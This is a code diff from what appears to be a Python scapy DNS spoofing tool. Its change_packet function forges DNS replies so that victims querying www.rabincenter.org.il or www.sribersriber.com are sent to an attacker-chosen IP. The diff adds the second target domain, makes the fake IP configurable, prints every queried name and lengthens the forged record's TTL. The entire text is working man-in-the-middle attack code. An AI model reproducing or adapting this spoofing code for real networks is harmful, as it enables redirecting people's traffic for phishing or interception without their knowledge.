@@ -171,16 +171,17 @@ def filter_packets(packet):
 def change_packet(pkt):
     # get the real name of the query
     real_name = pkt[DNSQR].qname.decode()[:-1]
-    fake_ip = "157.240.20.35"
+    fake_ip = ip
     # if the victim entered the given website, change the packet
     spoofed = False
-    if real_name == "www.rabincenter.org.il":
+    print(real_name)
+    if real_name in ["www.rabincenter.org.il", "www.sribersriber.com"]:
         spoofed = True
         # create a reply to the query with the same name but a different ip
         spoofed_pkt = Ether() / IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                       UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                       DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=0, qr=1,
-                          an=DNSRR(rrname=pkt[DNSQR].qname, ttl=15, rdata=fake_ip))
+                          an=DNSRR(rrname=pkt[DNSQR].qname, ttl=50, rdata=fake_ip))
         # deletes old checksums
         del pkt[IP].len
         del pkt[IP].chksum
